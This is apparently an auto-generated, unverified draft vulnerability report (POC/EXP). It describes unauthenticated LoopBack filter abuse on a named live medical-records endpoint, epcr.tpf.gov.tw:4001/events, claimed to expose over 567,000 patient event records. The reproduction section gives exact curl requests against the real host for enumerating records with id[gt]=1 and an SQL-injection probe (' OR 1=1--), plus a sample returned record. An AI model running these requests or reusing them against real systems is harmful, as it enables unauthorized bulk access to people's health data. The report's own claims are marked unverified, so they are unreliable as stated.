# POC/EXP — 4001 /events LoopBack 过滤器无认证可用，可批量拉取 PHI

> 漏洞ID: `489c1d4e-2d23-4241-9623-140184925eea`  | 嚴重度: **high** | 狀態: open | 目標: `https://epcr.tpf.gov.tw:4001/events`

**類型**: 未授权访问 / 过滤器滥用

## 描述

4001 vitalSignVideoServer 的 /events 接口支持 LoopBack 风格过滤器（如 id[gt]=1、CaseID=$ne、recordUuid=$ne），且无认证即可使用，攻击者可批量拉取 567201 条 PCDT 医疗事件数据（含 CaseID/recordUuid/血压值/时间线等），形成大规模 PHI 泄露。

## 前置條件

公网可达 https://epcr.tpf.gov.tw:4001

## POC / 復現步驟

```
curl -sk 'https://epcr.tpf.gov.tw:4001/events?id%5Bgt%5D=1&limit=1' 返回 HTTP 200，body 包含 [{"id":2,"CaseID":"180717152801fed7","recordUuid":"Test180805142701",...},...]，说明 id[gt]=1 过滤器生效且无认证；curl -sk 'https://epcr.tpf.gov.tw:4001/events?CaseID=%27%20OR%201%3D1--&limit=1' 返回 []，说明字段被当作精确匹配而非 SQL 注入
```

---

## 驗證要點

- [ ] 僅在授權範圍內驗證
- [ ] 最小化請求逐步驗證,留存原始請求/回應
- [ ] 失敗需記錄負結果,避免誤報
- [ ] 未實際驗證前狀態不得改為 confirmed

> 本文件由 JySecAI 自動生成,狀態:**草稿(未驗證)**
